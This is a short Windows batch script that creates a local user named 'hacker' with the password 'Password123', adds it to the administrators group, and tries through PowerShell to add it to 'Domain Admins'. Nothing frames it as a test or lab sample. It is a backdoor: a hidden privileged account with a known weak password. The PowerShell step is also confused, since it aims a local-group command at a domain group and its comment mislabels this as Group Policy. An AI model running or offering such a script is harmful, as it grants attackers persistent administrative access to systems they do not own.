@echo off
setlocal EnableDelayedExpansion

:: Create a new user with administrator privileges
net user hacker Password123 /add
net localgroup administrators hacker /add

:: Add the new user to the Group Policy
powershell -Command "Add-LocalGroupMember -Group 'Domain Admins' -Member hacker"

endlocal